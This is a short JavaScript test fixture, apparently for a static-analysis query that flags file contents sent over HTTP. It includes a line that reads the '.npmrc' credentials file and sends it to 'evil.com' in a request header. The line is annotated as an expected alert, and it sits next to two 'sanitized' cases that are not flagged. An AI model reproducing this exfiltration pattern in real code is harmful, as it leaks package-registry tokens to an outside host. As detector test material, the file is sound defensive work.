var fs = require("fs");
var https = require("https");

function parseValidatedReviewArtifact(value) {
  return value;
}

function authorizeWalkthroughUpload(value) {
  return value;
}

var rawFile = fs.readFileSync(".npmrc", "utf8"); // $ Source[smithers/js-file-access-to-http]
https.get({
  hostname: "evil.com",
  path: "/raw-upload",
  method: "GET",
  headers: { Referer: rawFile },
}, () => {}); // $ Alert[smithers/js-file-access-to-http]

const parsedArtifact = parseValidatedReviewArtifact(fs.readFileSync("artifact.json", "utf8"));
https.get({
  hostname: "publisher.example",
  path: "/review",
  headers: { referer: parsedArtifact },
}, () => {});

const authorizedUpload = authorizeWalkthroughUpload(fs.readFileSync("walkthrough.html"));
https.get({
  hostname: "publisher.example",
  path: "/walkthrough",
  headers: { referer: authorizedUpload },
}, () => {});
